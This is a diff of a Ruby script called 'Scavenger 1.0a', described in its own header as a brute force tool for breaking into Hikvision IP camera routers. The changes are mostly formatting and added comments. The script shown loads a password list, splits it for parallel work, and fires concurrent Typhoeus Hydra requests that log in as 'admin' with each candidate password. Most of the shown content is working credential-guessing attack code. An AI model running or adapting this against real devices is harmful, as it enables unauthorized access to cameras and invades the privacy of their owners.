@@ -1,9 +1,10 @@
 #!/usr/bin/ruby
 
 ###################################################################################################
-#Author 	: Shankar Damodaran								                                                      #
-#Codename   	: Scavenger 1.0a								                                                    #
-#Description	: A brute force script that attempts to break in Hikvision IP Camera Routers	      #
+#Author 	: Shankar Damodaran								                                                      
+#Codename   	: Scavenger 1.0a								                                     
+#Description	: A brute force script that attempts to break in Hikvision IP Camera Routers
+#Filename	: skavngr.rb
 ###################################################################################################
 
 
@@ -22,7 +23,9 @@ file_path = 'pathtoyourpasswordlist'
 ######## Configuration Ends ##########
 
 
-passwords = [] # The passwords list container
+
+# The passwords list container
+passwords = [] 
 
 
 puts "Initializing the password list. Please wait...";
@@ -37,18 +40,13 @@ end
 # The actual call to the above method
 read_array(file_path,passwords)
 
-
-
 time = Time.new
-
 totpasswords = passwords.length
 
 puts "\n#{totpasswords} passwords loaded. \nBruteforce Sequence Initialization Started at #{time.inspect}"
 
-
 # Chopping the array in certain sets to fasten up parallelization
 new_pass = passwords.each_slice((totpasswords/2).round).to_a
-
 
 
 # The module that does the parallelization using Typhoeus Hydra
@@ -71,6 +69,7 @@ def multi_channel_split(target,req,passwords)
 			                                  method: :get,
 			                                  userpwd: "admin:#{passwords[i]}")
 		  i+=1
+		  # The requests are queued and once when it is out of the loop, it is subjected to hydra.run
 		  hydra.queue(request)
 		  request
 		  
@@ -89,17 +88,15 @@ def multi_channel_split(target,req,passwords)
 			
 			end
 		j+=1
-		
-			
+
 		}
 
-
+# End of the parallelization module
 end
 
 # The chopped array is subjected here to call the module.
 new_pass.each do |req|
 	multi_channel_split(target,req.length,req)
-
 end
 
 puts "\nPassword was not found in this list. Subject another file to start a new operation.".red
